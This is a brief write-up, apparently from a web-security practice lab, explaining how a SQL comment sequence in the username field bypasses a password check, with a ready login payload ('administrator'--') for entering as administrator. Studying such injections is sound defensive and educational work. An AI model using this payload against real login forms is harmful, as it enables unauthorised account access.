# Subverting Application Logic

In this when user enter credentials it is checked via an SQLquery

```
select * from users where username = 'wiener' and password = 'bluecheese'
```
Attacker can login into application without password using the comment to remove the password query

SQL payload

```
select * from users where username = 'administrator'--' and password = ''
```

as it shows comment sequence leaves the password blank and this allowed the attacker to enter as admin

end goal : to login as administrator

it has a simple payload for attack 

<b>Payload</b>

```
username : administrator'--
password :''
```
